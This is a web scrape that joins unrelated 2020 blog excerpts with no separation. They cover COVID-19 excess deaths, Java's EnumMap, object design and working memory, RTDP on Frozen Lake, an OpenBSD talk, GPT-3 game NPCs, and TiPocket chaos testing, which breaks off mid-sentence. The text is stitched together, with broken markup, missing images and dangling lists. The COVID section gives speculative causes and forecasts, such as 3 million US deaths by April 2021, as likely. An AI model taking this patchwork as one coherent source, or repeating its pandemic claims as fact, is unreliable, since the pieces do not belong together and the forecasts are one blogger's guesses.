<p><a href="https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-TX.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-TX-1024x765.png" alt="" width="650" height="485" srcset="https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-TX-1024x765.png 1024w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-TX-300x224.png 300w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-TX-768x574.png 768w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-TX-1536x1147.png 1536w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-TX-2048x1529.png 2048w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-TX-203x150.png 203w" sizes="(max-width: 650px) 100vw, 650px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-TX-1024x765.png" data-srcset="https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-TX-1024x765.png 1024w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-TX-300x224.png 300w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-TX-768x574.png 768w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-TX-1536x1147.png 1536w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-TX-2048x1529.png 2048w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-TX-203x150.png 203w"></a>The deaths one standard deviation above the norm (norm being deaths in 2015-2019) are highly correlate with the number of <em>new cases </em>of COVID19, rather than that of COVID19 related <em>deaths</em>.</p>
<p>This implies one of the following:</p>
<ol>
<li>COVID19 deaths are being attributed to another illness</li>
<li>Hospitals are focusing on the COVID19 patients and other critically ill patients are dying (at an alarming rate)</li>
<li>Some other catastrophe is happening</li>
</ol>
<p>Regardless, as more people test positive, more people are dying and there is a high correlation between the two. If I had to guess, this really means people aren’t being tested until after they are dead or critically ill &amp; in the hospital.</p>
<h2><span>Decreased Testing</span></h2>
<p>It’s also important to bring attention to the <span>decreasing number of tests from July 9, 2020 and August 13, 2020</span>. Time will tell if the rate of fatalities will drop (or if just the COVID19 related deaths will), the decreased testing volume correlates exactly with the declining positive cases (as one would suspect).</p>

Under-reporting appears to be a signal that there is not enough testing – aka the system is overwhelmed. This makes logical sense, as the system becomes overwhelmed, resources are diverted on saving lives over identifying community spread. There’s also a question if the test results are being reported federally and outside my dataset for some reason.</p>

<p>It is difficult mid-pandemic with a lack of testing to determine the case <a href="https://newslit.org/updates/case-fatality-rate-vs-mortality-rate/" target="_blank" rel="noopener noreferrer">fatality rate (CFR) or mortality rate</a>, which is typically what is being reported. Unfortunately, we don’t know the infection rate. With that in mind, it’s probably more accurate to track the “increased risk of dying in 2020”.</p>
<p>In other words:</p>
<blockquote><p>How much greater are my risks of dying in 2020 over 2019?</p></blockquote>
<p>Infection rate is included as part of metric, we don’t know the extent. COVID19 penetration is <em>maybe</em> 10% across the U.S. population (studies vary wildly). Regardless, as the year progresses, we are sure this number will increase.</p>
<p>With that in mind, on average all age groups over 25, are seeing roughly 10-15% increased risk of dying in 2020 over 2019 (again, this will likely increase):<a href="https://austingwalters.com/wp-content/uploads/2020/08/us-deaths-by-age-group.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2020/08/us-deaths-by-age-group-1024x678.png" alt="" width="750" height="497" srcset="https://austingwalters.com/wp-content/uploads/2020/08/us-deaths-by-age-group-1024x678.png 1024w, https://austingwalters.com/wp-content/uploads/2020/08/us-deaths-by-age-group-300x199.png 300w, https://austingwalters.com/wp-content/uploads/2020/08/us-deaths-by-age-group-768x509.png 768w, https://austingwalters.com/wp-content/uploads/2020/08/us-deaths-by-age-group-1536x1017.png 1536w, https://austingwalters.com/wp-content/uploads/2020/08/us-deaths-by-age-group-2048x1357.png 2048w" sizes="(max-width: 750px) 100vw, 750px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2020/08/us-deaths-by-age-group-1024x678.png" data-srcset="https://austingwalters.com/wp-content/uploads/2020/08/us-deaths-by-age-group-1024x678.png 1024w, https://austingwalters.com/wp-content/uploads/2020/08/us-deaths-by-age-group-300x199.png 300w, https://austingwalters.com/wp-content/uploads/2020/08/us-deaths-by-age-group-768x509.png 768w, https://austingwalters.com/wp-content/uploads/2020/08/us-deaths-by-age-group-1536x1017.png 1536w, https://austingwalters.com/wp-content/uploads/2020/08/us-deaths-by-age-group-2048x1357.png 2048w"></a>Focusing on <strong>New York</strong>, which appears to have kept decent records &amp; has a decent infection rate – the data looks stark:</p>

It’s probably Texas hasn’t had as much of a proliferation of COVID19 yet and most of the spread has been related to young gathers. Leading to our next section…</p>
<h2><span>COVID19 Spread due to Gatherings</span></h2>
<p>It’s important to acknowledge, that as people gather Coronavirus spreads more easily. Particularly, in <strong>Texas</strong>, <strong>Florida</strong>, <strong>Illinois</strong> and others started to see a rise in fatalities (and infections) following rises in heat (pushing gatherings in doors), protests, and generally opening bars.</p>
<p>Particularly, the rise of deaths in <strong>Texas</strong> coincide directly with the protests (Starting week 22 and rising to the present):</p>

<p><strong>Florida</strong> has seen the same effect, in the exact same time range:</p>

Personally, I suspect heat is the largest factor. People gathered outside to protest or celebrate (July 4th) and ended up congregating inside, without masks. This lead to an increase in spread and fatalities, as moving indoors confines people together, in air conditioning, with minimal mask protection or UV to kill the virus.</p>

<p>Finally, in prior discussions I’ve made predictions. Largely, these predictions came from running simulations (both on my own and available to me). As it stands, I continue to stand by my prior prediction:</p>
<ul>
<li>3 million COVID-19 deaths in the United States is likely (April 1, 2021)</li>
<li>25% [true] unemployment in the United States is likely</li>

<p>That’s an estimated 180k to 1.85m dead by October 14th. Personally, for the officially count, I’d err on the side of the lower values, perhaps 250k. However, I suspect deaths will be under counted due to lack of testing, I suspect the real figures will be closer to 500k-800k after analysis, this would more closely matching the findings above (which indicate we are already over 200k).</p>

<h2>Java EnumMap Class</h2>
<p>Java.util package provides a EnumMap class which is a specialized Map implementation for use with enum type keys. All of the keys in an enum map must come from a single enum type that is specified, explicitly or implicitly, when the map is created. Enum maps are maintained in the natural order of their keys (the order in which the enum constants are declared). Null keys are not permitted. Attempts to insert a null key will throw NullPointerException. Null values are permitted.</p>

<p>EnumMap is not synchronized. If multiple threads access an enum map concurrently, and at least one of the threads modifies the map, it should be synchronized externally.</p>


<h3>Class declaration</h3>
<p>The declaration of java.util.EnumMap class is:</p>
<div>
    
<pre>public class EnumMap&lt;K extends Enum&lt;K&gt;,V&gt;
  extends AbstractMap&lt;K,V&gt;
    implements Serializable, Cloneable
</pre>
</div>


<p>The java.util.EnumMap has a number of methods which are listed below:</p>

	<p>Write code that’s compatible with how your brain works.</p>
	
	<p><strong>Video</strong>: <a href="https://youtu.be/D8Pb8TvYsCE">Philip reading this essay</a>.</p>
<p>The 1956 paper <em><a href="http://psychclassics.yorku.ca/Miller/">The Magical Number Seven, Plus or Minus
Two</a></em> is the most widely cited paper
in the 126 year history of the journal <em><a href="https://en.wikipedia.org/wiki/Psychological_Review">Psychological
Review</a></em>. The author
<a href="https://en.wikipedia.org/wiki/George_Armitage_Miller">George A. Miller</a> is
considered one of the founders in the field of cognitive science. His
historic claim is that you can only juggle <strong>between 5 and 9 things</strong> in
your brain at any one time.</p>
<p>To my knowledge, despite some
<a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC4486516/">controversy</a> over
the years, this 7 ± 2 figure has withstood the ongoing
<a href="https://www.nature.com/news/1-500-scientists-lift-the-lid-on-reproducibility-1.19970">reproducibility
crisis</a>
and it appears to capture a deep truth about how our brains actually
function.</p>
<p>Many people are skeptical of the claim because seven sounds like an
absurdly small number, surely if you are doing something complex like
writing software, or planning a wedding for that matter, you are juggling
dozens to hundreds of things? As it turns out you are not. At least not at
once.</p>

The first 225 digits of <a href="https://dancohen.org/2010/03/08/the-last-digit-of-pi/">Pi</a>.
</p>
	
</div>
<p>In 2005 <strong>Lu Chao</strong> recited <a href="https://www.livescience.com/50134-pi-day-memory-experts.html">67,890
digits</a> of
Pi, a mind-boggling demonstration of a gifted and well-trained mind. Yet
given a series of random single-digit numbers he can on average recall less
the than nine of them, to be exact he’s been measured to have a <a href="https://en.wikipedia.org/wiki/Memory_span#Digit-span">digit
span</a> of 8.83 which
fits perfectly within Miller’s finding. Amazing!</p>
<p>Chao memorizes Pi the same way story tellers once memorized long tales
about <a href="https://en.wikipedia.org/wiki/Gilgamesh">Gilgamesh</a>, yet he can only
juggle a handful of things at one time. I find this actually to be very
comforting, he is not a freak of nature, at least not as freaky as you
first thought.</p>
<p>The illusion we can hold many things in mind is almost identical to the
illusion that our field of view is high resolution everywhere. It’s
incredibly compelling because the instant we wonder <em>what’s over there</em> we
do a quick <a href="https://en.wikipedia.org/wiki/Saccade">saccade</a> and are
immediately rewarded with a high resolution view of exactly <em>what’s over
there</em>. We ask the question and we get an instant answer, so it feels like
the answer was there the whole time.</p>

fovea is, it's actually only about as big as quarter held at arm's length.

<p>Thinking in general works very much like vision. This is not surprising
since it’s implemented using the same brain hardware. As we rapidly flit
from idea to idea, from concept to concept, we page in the necessary
details, but at no time do we have more than about nine individual things
in the front of our minds.</p>
<p>How do we navigate a complex world with this seemingly crippling limit on
the size of our working memory? Two of the primary tools that we use are
<a href="https://en.wikipedia.org/wiki/Chunking_(psychology)">chunking</a> and
<a href="https://en.wikipedia.org/wiki/Hierarchy">hierarchy</a>.</p>
<p>When we think of a car we naturally divide the car into a handful of high
level chunks like the <em>engine</em>, the <em>dashboard</em>, the <em>seats</em>, the <em>wheels</em>.
When we mentally zoom into the engine, however, it effortlessly resolves
into more parts: the <em>engine block</em>, the <em>pistons</em>, the <em>spark plugs</em>. And
we can keep zooming in, although how far we can zoom in highly depends on
how much we know about cars and the world in general.</p>
<p>In <a href="https://en.wikipedia.org/wiki/Object-oriented_programming">Object Oriented
Programming</a> one
of the simplest ways to tame complexity is to limit your objects to around
seven <em>attributes</em>. In some languages attributes are called <em>member
variables</em> or <em>fields</em>. Many programmers immediately balk at this
suggestion. Sure, that works for toy examples, but I’m writing serious
software and my objects sometimes need 10, 20 or 50 attributes. You must be
working on easy stuff, they will say. My problems are special, so my code
has to be different.</p>
<p>The biggest trap of software development is that it’s easy, trivial in
fact, to write software that you yourself cannot understand, and in turn no
one else can understand. Even a novice, <em>especially</em> a novice, can in a few
weeks write software that literally no one on the planet can easily think
or reason about. That’s depressing, but also kind of impressive in a way.
With great power comes great responsibility.</p>
<p>Objects which have too many attributes are a major cause of software that’s
too complicated to understand. Some people conclude the problem is Object
Oriented Programming itself. This is not a crazy idea, there are <a href="https://tobeva.com/resources/technical/programming/functional/">other
ways</a> to program, and they do
have advantages, but in my experience most of the flaws attributed to
Object Oriented Programming stem from having done it poorly, and boy is it
easy to do poorly.</p>







<div>
	<p><img src="https://tobeva.com/articles/brain-oriented-programming/complex_hua73d922edef0eeb6c3d75f190e4c0729_39455_350x0_resize_q75_catmullrom.jpg" width="350" height="197"></p><p>
Complexity grows without bound.
</p>
	
</div>
<p>The key thing to realize is a single object with a lot of attributes is
itself <em>not</em> Object Oriented. Instead, it’s a 1970s style <a href="https://en.wikipedia.org/wiki/Structured_programming">Structured
Program</a> in disguise.
The attributes of the object are the <strong>global variables</strong> of the program,
and the object’s methods are the program’s <strong>functions</strong>. Every function
can freely access every global variable which is what causes many of the
problems.</p>
<p>A structured program with more than seven global variables is trouble, and
if many objects in your program are effectively messy structured programs
themselves, you are in serious trouble indeed. At a high level you are
doing Object Oriented Programming, but at a low level you are right back in
the 1970s struggling to deal with one confusing program after the next.</p>
<p>How do we save this sinking ship? We save it by actively and aggressively
keeping the number of attributes per object <strong>at or below seven</strong>. If you
fail to do this you are punting the problem <em>to your future self</em>, a
problem that by definition your future self is going to have a hard time
solving.</p>
<p>Just today I had a <a href="https://www.python.org/">Python</a> class called
<code>PerfEvent</code> with these attributes:</p>
<div><pre><code data-lang="python">        <span>self</span><span>.</span><span>name</span> <span>=</span> <span>name</span>
        <span>self</span><span>.</span><span>start_ns</span> <span>=</span> <span>start_ns</span>
        <span>self</span><span>.</span><span>end_ns</span> <span>=</span> <span>end_ns</span>
        <span>self</span><span>.</span><span>category</span> <span>=</span> <span>category</span>
        <span>self</span><span>.</span><span>process_id</span> <span>=</span> <span>process_id</span>
        <span>self</span><span>.</span><span>thread_id</span> <span>=</span> <span>thread_id</span>
        <span>self</span><span>.</span><span>args</span> <span>=</span> <span>kwargs</span>
        <span>self</span><span>.</span><span>phase</span> <span>=</span> <span>phase</span></code></pre></div>
<p>That’s eight attributes, since eight is only one over the limit, should we
wait until the object grows bigger? No, let’s deal with it <em>now</em>. To reduce
the number of attributes we introduce two new classes or structs: <code>Span</code>
and <code>Origin</code>. Each only has two attributes, but now the original object has
been slimmed down to six attributes, all is well again:</p>

<p>Although it’s a minor change, compare the two versions, the improved one
simply <em>looks</em> better, even if you stand far back and squint.</p>
<p>It seems minor, but if you don’t make these types of changes as you go it
will eventually lead to <em>intractable</em> complexity, the type of complexity
that causes projects and companies to fail, the type of complexity that
seduces humans into wasting <a href="https://spectrum.ieee.org/computing/software/why-software-fails">billions of
dollars</a>
every year writing software that does not work.</p>
<p>The benefits of introducing sub-objects goes far beyond just reducing the
number of attributes. While accessing the attributes is slightly more
verbose, I like the sound of <code>self.span.start_ns</code> compared to just
<code>self.start_ns</code>, but more importantly we can now pass <code>Span</code>'s and
<code>Owner</code>'s to functions, slimming down and chunking <em>their</em> argument lists.</p>
<p>We’ve introduced two natural and useful concepts that will pay ongoing
dividends, but even better don’t just think of how your code is today,
think about how it’s going to grow over time. Your single monolithic object
has sprouted two buds. You can now push functionality down into these buds,
and they can grow into branches, which later can sprout buds of their own.</p>
<p>For example we can now give <code>Span</code> a <code>get_duration_ns()</code> method. Again it seems
minor, but writing <code>span.get_duration_ns()</code> is better than writing
<code>span.end_ns - span.start_ns</code> especially if you are going to do that in
many different places.</p>
<p>The real magic though is that the benefits of being disciplined will accrue
like <a href="https://youtu.be/GtaoP0skPWc">compound interest</a> as you convert your
monolithic object into an intricately structured tree which buds and
sprouts and branches organically. You will benefit from this better design
every minute you are working on the software, and the software will benefit
greatly from your improved mood and ability to sustain focus.</p>

A carefully tended <a href="https://en.wikipedia.org/wiki/Bonsai">Bonsai</a> tree.
</p>
	
</div>
<p>Code, like most human created artifacts, can be beautiful, so there is an
aesthetic pay off here, but the real jackpot is that if you assiduously
tend and groom this tree you will create a software design that slides into
your head with minimal fuss and friction, and slides similarly into the
heads of other people.</p>
<p>It’s no accident that we find natural environments to be more soothing than
the made world, than the concrete jungle. The design of the natural world
tends to be more in harmony with how our brains think about that world.
Game recognizes game.</p>
<p>Over time, you will grow a system that you and others can <strong>understand</strong>,
<strong>maintain</strong>, <strong>debug</strong> and <strong>extend</strong>. When people look at your code years
from now, maybe even in the <a href="https://archiveprogram.github.com/">far
future</a>, they will benefit from your
diligence and hard work. And the punchline is doing all this is not hard.
In fact, it’s <em>much easier</em> to do this work than not to not do it.</p>
<p>It’s easier and more pleasant to work with something that’s well crafted
and simpatico with your thinking. It’s hard and unpleasant to constantly
wrestle with something you don’t understand. Trim, prune and shape your
objects early and often. Your brain will thank you.</p>

August 14, 2020 | https://blog.xa0.de/post/Real---time-Dynamic-Programming%20%28RTDP%29-applied-to-Frozen-Lake/ | <a href="https://web.archive.org/web/*/https://blog.xa0.de/post/Real---time-Dynamic-Programming%20%28RTDP%29-applied-to-Frozen-Lake/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<div>

<p>Real-time dynamic programming<sup id="fnref:B94"><a href="#fn:B94">1</a></sup> (RTDP) uses Markov Decision Processes (MDPs) as a model of the environment. It samples paths through the state space based on the current greedy policy and updates the values along its way. It's an efficient way of real-time planning, since not necessarily the whole state space is visited, and works well for stochastic environments.
As such, with some additional work, it is possible to apply RTDP on stochastic gym environments such as frozen lake. In my case, I tried just that. Given a 20x20 map and full observability, RTDP successfully gets a decent reward after a few minutes of training on one core.
The source code can be found at the end of the post.</p>
<p>Here's the algorithm:</p>
<div>
<p><img src="https://xa0.de/fs/data%2Frtdp.webp">
</p>
</div>

<p>And this is the environment:</p>
<pre>SFFFFFFFHFFFFFFHFHFF
FFFFFFFFFFFHFFFFFHFF
FFHFFHFHFFFFFFHFFFFH
FFHFFHFFFFFFFFHFFHFF
FFFHFFFFFFFFFFFFFFHF
FFFFHFFFFFHFFFFHFFFH
FFFFFFFHFHFFHFFFFFFF
HFHFFFFFFFFFFHFFFFFF
HFFFFFFFFHHFHFFHHFFF
FFFFFFFFFHFHFFFFFFFF
FFFFFFFFFFFFHFFFFFFH
FFFFFFFHFFFFFFFFFFFH
FFFFFFHFFFFFFFFFHHFF
HFFHFFFHHFHFFFHHFFFF
FFFFFFFFFHFHFFHHHFFF
HFFFFFHFFFFFHFHFFFFF
HFFFFFFFFFFFFFFFHFFH
FHFFFFFFFHFFFFFFFFFF
FFHFFFFFFFHFFFFHFHFF
FFHFHFFFFFFFHHFFFFFG
</pre>

<p>For the MDP we need four components: States, actions, transition matrix and costs.
Fortunately, since we're using a gym environment, most of this is already given. There are four actions, the states are known and the gym environment exports the transition matrix (including the probabilities). That is, only the costs are missing. Out of the box, frozen lake only gives one positive reward at the very goal. In all other cases, e.g. falling into a hole, zero.
One idea for a custom cost mapping could be: 0.1 for each action, 1 for a hole, -1 for the goal (negative cost).
A keyword related to negative cost is self-absorbing goals, i.e. goals that have just a single action going back to the goal itself with 0 or even negative cost. A self-absorbing goal is a requirement of stochastic shortest path MDPs (SSP MDPs)<sup id="fnref:BG02"><a href="#fn:BG02">4</a></sup>, which is pretty much what we have here. We want the path with the lowest cost (which is the same as a shortest path with lowest cost=time). By the way, gamma needs to be set to 1.</p>
<p>As a result of the above mapping, RTDP achieves an average reward of 0.48 (over 10000 evaluations).
This is great, since this is not an easy stochastic environment - you only have a chance of 33% of actually ending up where you intend to be!
But this is also where RTDP excels. A faster alternative to RTDP would be discretizing the transition probabilities and applying D* Lite.</p>
<p>There are also improvements to RTDP, such as BRTDP<sup id="fnref:M05"><a href="#fn:M05">2</a></sup>.
For more information, refer to Mausam and Kobolov<sup id="fnref:MK12"><a href="#fn:MK12">3</a></sup>.

  <iframe src="https://www.youtube.com/embed/EkDVKthufAM" allowfullscreen="" title="YouTube Video"></iframe>
</p>


<p>
I recently gave a talk at work to help introduce OpenBSD to my
colleagues. It's a broad introduction to the fundamentals of security
in OpenBSD, as well as some basic system administration tips and
suggestions anyone coming from a Linux background might find useful.
</p>
<p>
It's roughly split up into four sections; the history of OpenBSD,
what sets it apart from other operating systems, a guided
installation, and the system administration introduction.
</p>
<p>
In the original presentation the guided installation was done
interactively with the participants installing OpenBSD in a VM on
their machines to follow along with the slides.
</p>
<p>
I've tried my best to make it as accessible as possible while still
covering the most important beats. If you find any errors please let
me know so I can correct them, my contact info is on the <a href="https://blog.lambda.cx/about/">about</a> page.
</p>
<p>
I've corrected several small issues with the slides since the
recording. I've replaced the file name <code>/etc/mygateway</code> with <code>/etc/mygate</code>,
replaced the smartquotes with regular quotes, and removed the rebound
program, to name the biggest fixes. These corrections are available at
the slides linked below.

<![CDATA[Using OpenAI's GPT-3 to enrich NPC interactions]]>

August 14, 2020 | https://blog.writtenrealms.com/gpt3/ | <a href="https://web.archive.org/web/*/https://blog.writtenrealms.com/gpt3/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>How Written Realms is using the latest generation of Artificial Intelligence to animate its fictional worlds.</p><div>
<p>We were fortunate enough to receive an invite to the <a href="https://openai.com/blog/openai-api/">OpenAI private beta</a> a few weeks ago, gaining an interface to their <a href="https://arxiv.org/abs/2005.14165">GPT-3</a> engine. Using AI for mob interactions within <a href="https://writtenrealms.com/">Written Realms</a> had been a long term goal of ours for many years, and we jumped at the opportunity to play with it.</p>
<h2 id="howtheopenaiapiworks">How the OpenAI API works</h2>
<p>The OpenAI API provides a 'completion' endpoint (also available as a Python binding) for interacting with the GPT-3 engine.</p>
<p>Given a text prompt, the API attempts to complete the pattern that you gave it. For example if you give it an input of <code>1 2 4 8</code> and request 1 token back, you will get a response of: <code>16</code>. The API understood the pattern to be a doubling function and gave the next result.</p>
<p>It's not limited to math. If you give as input <code>Barking is to dogs as meowing is to</code>, you will get as a result: <code>cats</code>.</p>
<p>Not only is GPT-3 good at reading comprehension, but it also good at tailoring its output to match the style of the input. Consider the following prompt:</p>
<pre><code>Tom went fishing all afternoon. He comes home to his wife at sunset, who asks him a question.

Question: What did you do today?
Answer:
</code></pre>
<p>The API returns <code>I went fishing.</code> </p>
<p>It is possible to get a more creative answer by providing more information in the prompt and turning up the <code>temperature</code> setting, which gives GPT-3 more of a creative license to make stuff up. For example, if after adding <code>Tom responds enthusiastically, providing many details.</code> to the prompt before the question and turning the temperature to its max value, here's how the API responded: </p>
<pre><code>I went fishing all day, and in the afternoon I fought the biggest fish that I have ever seen before. I just held on for as long as I could, because once I gave up there was no way I was getting the fish back again. I had to pull everything I could, and my catch ended up weighing 3 pounds of flounder and 4 pounds of bluegill.
</code></pre>
<p>Evidently, GPT-3 is quite proficient at making stuff up given the right temperature.</p>
<h2 id="howwereusinggpt3">How we're using GPT-3</h2>
<p>For our first foray into GPT-3, we created a Historian NPC (Non-Player Character) who is able to answer arbitrary questions about Edeus, our flagship world. All of our lore is original and it can be challenging to impart it all to the players at once. An AI able to answer the organic questions of a player in real-time seemed like a perfect use-case.</p>
<p>We already had a feature called 'Reactions' that allows NPCs to respond to something said in their room with predetermined commands. The adjustment made here was to add a <code>gpt</code> flag to the Historian which at reaction time forwards the user's input to OpenAI in order to get the response.</p>
<p>As with the fisherman above, we can use the dialog pattern, and precede it with a certain context, which explains to GPT-3 what the background is for the interactions. In this case, we gave it an excerpt from a fictional history book written by the NPC in question, and then provided a little bit of background about the NPC himself. Here is a sample interaction with him:</p>
<pre><code>You say 'hello there'
Grae the Historian says 'Greetings, traveler.'

You say 'Who are you?'
Grae the Historian says 'I am Historian Grae, a Priest of the Church of Thune.'

You say 'Where are we?'
Grae the Historian says 'You are in Bluefinch, a village in the realm of Saphrin.'

You say 'Is there anything I should be doing?'
Grae the Historian says 'You should be killing orcs.'

You say 'Why? What have the orcs ever done to us?'
Grae the Historian says 'The orcs are evil. They want to destroy us.'

You say 'Okay. Can you tell me more about our origin?'
Grae the Historian says 'Humans were created by Thune, the Allmighty God.'

You say 'Who rules this area?'
Grae the Historian says 'The King of Saphrin, Arctus Kerinin, rules this area.'

You say 'Thanks Grae! You've been very helpful'
Grae the Historian says 'You're welcome.'
</code></pre>
<p>If you want to test this out for yourself, Grae is located 3 north, 1 east of Bluefinch Square in Edeus. We're always tweaking his backstory and various settings so his outputs may (and should!) vary a bit.</p>
<h2 id="theknowledgeexclusionlimitation">The Knowledge Exclusion Limitation</h2>
<p>The main issue we've been running up against is that it's difficult to constrain the AI's knowledge to that of a fictional world. It cannot help knowing things about the real world. For example:</p>
<pre><code>You say 'When was JFK born?'
Grae the Historian says 'John Fitzgerald Kennedy was born on May 29, 1917.'
</code></pre>
<p>Ideally, the historian would not know about anything outside of Edeus. But even though we specify in the prompt's backstory that he only answers questions pertaining to his own world, that distinction is not always understood. It's difficult to exclude knowledge.</p>
<h2 id="futureimprovements">Future Improvements</h2>
<p>We plan to keep iterating and try to make the AI feel as human and authentic as possible. One issue is that currently each interaction with the NPC is its own isolated event. For example:</p>
<pre><code>You say 'What is the name of this village?'
Grae the Historian says 'This village is called Bluefinch.'

You say 'Where did it get its name from?'
Grae the Historian says 'Edeus is named after the two titans that fought in the First Age. Thune and Raeshyk.'
</code></pre>
<p>Clearly the NPC didn't connect that the second question was a follow-up from the first. This is because each time we do a call to OpenAI we append the user's query to the end of the same base prompt, making each a separate interaction. It could be improved upon by including a few of the previous back and forths when generating a new prompt, provided it was the same player.</p>
<p>There's also entirely different ways we could leverage GPT-3. For example, it could be used to generate content like room, character and item descriptions, or even dynamic quests. A text-based platform and a text-based AI share great synergy, and the possible applications of it seem endless to the imaginative.</p></div></div>]]>

Although it provides rich capabilities to simulate abnormal system conditions, it still only solves a fraction of the Chaos Engineering puzzle. Besides fault injection, a full chaos engineering application consists of hypothesizing around defined steady states, running experiments in production, validating the system via test cases, and automating the testing.</p><p>This article describes how we use <a href="https://github.com/pingcap/tipocket" target="_blank" rel="noopener noreferrer">TiPocket</a>, an automated testing framework to build a full Chaos Engineering testing loop for TiDB, our distributed database.</p><h2>Why do we need TiPocket?</h2><p>Before we can put a distributed system like <a href="https://github.com/pingcap/tidb" target="_blank" rel="noopener noreferrer">TiDB</a> into production, we have to ensure that it is robust enough for day-to-day use. For this reason, several years ago we introduced Chaos Engineering into our testing framework. In our testing framework, we:</p><ol><li>Observe the normal metrics and develop our testing hypothesis.</li><li>Inject a list of failures into TiDB.</li><li>Run various test cases to verify TiDB in fault scenarios. </li><li>Monitor and collect test results for analysis and diagnosis.</li></ol><p>This sounds like a solid process, and we’ve used it for years. However, as TiDB evolves, the testing scale multiplies. We have multiple fault scenarios, against which dozens of test cases run in the Kubernetes testing cluster. Even with Chaos Mesh helping to inject failures, the remaining work can still be demanding—not to mention the challenge of automating the pipeline to make the testing scalable and efficient.</p><p>This is why we built TiPocket, a fully-automated testing framework based on Kubernetes and Chaos Mesh. Currently, we mainly use it to test TiDB clusters. However, because of TiPocket’s Kubernetes-friendly design and extensible interface, you can use Kubernetes’ create and delete logic to easily support other applications.</p><h2>How does it work</h2><p>Based on the above requirements, we need an automatic workflow that:</p><ul><li><a href="#injecting-chaos---chaos-mesh">Injects chaos</a></li><li><a href="#verifying-chaos-impacts-test-cases">Verifies the impact of that chaos</a></li><li><a href="#automating-the-chaos-pipeline---argo">Automates the chaos pipeline</a></li><li><a href="#visualizing-the-results-loki">Visualizes the results</a></li></ul><h3>Injecting chaos - Chaos Mesh</h3><p>Fault injection is the core chaos testing. In a distributed database, faults can happen anytime, anywhere—from node crashes, network partitions, and file system failures, to kernel panics. This is where Chaos Mesh comes in.</p><p>Currently, TiPocket supports the following types of fault injection:</p><ul><li><strong>Network</strong>: Simulates network partitions, random packet loss, disorder, duplication, or delay of links.</li><li><strong>Time skew</strong>: Simulates clock skew of the container to be tested.</li><li><strong>Kill</strong>: Kills the specified pod, either randomly in a cluster or within a component (TiDB, TiKV, or Placement Driver (PD)).</li><li><strong>I/O</strong>: Injects I/O delays in TiDB’s storage engine, TiKV,  to identify I/O related issues.</li></ul><p>With fault injection handled, we need to think about verification. How do we make sure TiDB can survive these faults?</p><h2>Verifying chaos impacts: test cases</h2><p>To validate how TiDB withstands chaos, we implemented dozens of test cases in TiPocket, combined with a variety of inspection tools. To give you an overview of how TiPocket verifies TiDB in the event of failures, consider the following test cases. These cases focus on SQL execution, transaction consistency, and transaction isolation.</p><h3>Fuzz testing: SQLsmith</h3><p><a href="https://github.com/pingcap/tipocket/tree/master/pkg/go-sqlsmith" target="_blank" rel="noopener noreferrer">SQLsmith</a> is a tool that generates random SQL queries. TiPocket creates a TiDB cluster and a MySQL instance.. The random SQL generated by SQLsmith is executed on TiDB and MySQL, and various faults are injected into the TiDB cluster to test. In the end, execution results are compared. If we detect inconsistencies, there are potential issues with our system.</p><h3>Transaction consistency testing: Bank and Porcupine</h3><p><a href="https://github.com/pingcap/tipocket/tree/master/cmd/bank" target="_blank" rel="noopener noreferrer">Bank</a> is a classical test case that simulates the transfer process in a banking system. Under snapshot isolation, all transfers must ensure that the total amount of all accounts must be consistent at every moment, even in the face of system failures. If there are inconsistencies in the total amount, there are potential issues with our system.</p><p><a href="https://github.com/anishathalye/porcupine" target="_blank" rel="noopener noreferrer">Porcupine</a> is a linearizability checker in Go built to test the correctness of distributed systems. It takes a sequential specification as executable Go code, along with a concurrent history, and it determines whether the history is linearizable with respect to the sequential specification. In TiPocket, we use the <a href="https://github.com/pingcap/tipocket/tree/master/pkg/check/porcupine" target="_blank" rel="noopener noreferrer">Porcupine</a> checker in multiple test cases to check whether TiDB meets the linearizability constraint.</p><h3>Transaction Isolation testing: Elle</h3><p><a href="https://github.com/jepsen-io/elle" target="_blank" rel="noopener noreferrer">Elle</a> is an inspection tool that verifies a database’s transaction isolation level. TiPocket integrates <a href="https://github.com/pingcap/tipocket/tree/master/pkg/elle" target="_blank" rel="noopener noreferrer">go-elle</a>, the Go implementation of the Elle inspection tool, to verify TiDB’s isolation level.</p><p>These are just a few of the test cases TiPocket uses to verify TiDB’s accuracy and stability. For more test cases and verification methods, see our <a href="https://github.com/pingcap/tipocket" target="_blank" rel="noopener noreferrer">source code</a>.</p><h2>Automating the chaos pipeline - Argo</h2><p>Now that we have Chaos Mesh to inject faults, a TiDB cluster to test, and ways to validate TiDB, how can we automate the chaos testing pipeline? Two options come to mind: we could implement the scheduling functionality in TiPocket, or hand over the job to existing open-source tools. To make TiPocket more dedicated to the testing part of our workflow, we chose the open-source tools approach. This, plus our all-in-K8s design, lead us directly to <a href="https://github.com/argoproj/argo" target="_blank" rel="noopener noreferrer">Argo</a>.</p><p>Argo is a workflow engine designed for Kubernetes. It has been an open source product for a long time, and has received widespread attention and application.</p><p>Argo has abstracted several custom resource definitions (CRDs) for workflows.  The most important ones include Workflow Template, Workflow, and Cron Workflow. Here is how Argo fits in TiPocket:</p><ul><li><strong>Workflow Template</strong> is a template defined in advance for each test task. Parameters can be passed in when the test is running.</li><li><strong>Workflow</strong> schedules multiple workflow templates in different orders, which form the tasks to be executed. Argo also lets you add conditions, loops, and directed acyclic graphs (DAGs) in the 